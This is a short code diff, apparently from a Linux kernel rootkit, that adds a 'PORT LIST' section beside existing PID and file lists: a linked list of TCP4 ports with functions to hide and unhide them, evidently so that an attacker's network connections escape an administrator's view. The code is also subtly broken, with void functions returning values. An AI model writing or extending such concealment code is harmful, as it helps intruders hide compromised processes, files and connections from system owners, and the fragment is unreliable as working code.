@@ -405,6 +405,49 @@ void pid_remove_all(void)
 // ========== END PID LIST ==========
 
 
+// ========== PORT LIST ==========
+
+struct hidden_port {
+    unsigned short port;
+    struct list_head list;
+};
+
+LIST_HEAD(hidden_tcp4_ports);
+
+void hide_tcp4_port ( unsigned short port )
+{
+    struct hidden_port *hp;
+
+    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
+    if ( ! hp )
+        return 0;
+
+    hp->port = port;
+
+    list_add(&hp->list, &hidden_tcp4_ports);
+	
+    return 1;
+}
+
+void unhide_tcp4_port ( unsigned short port )
+{
+    struct hidden_port *hp;
+
+    list_for_each_entry ( hp, &hidden_tcp4_ports, list )
+    {
+        if ( port == hp->port )
+        {
+            list_del(&hp->list);
+            kfree(hp);
+            break;
+        }
+    }
+}
+
+// ========== END PORT LIST ==========
+
+
+
 // ========== FILE LIST ==========
 
 
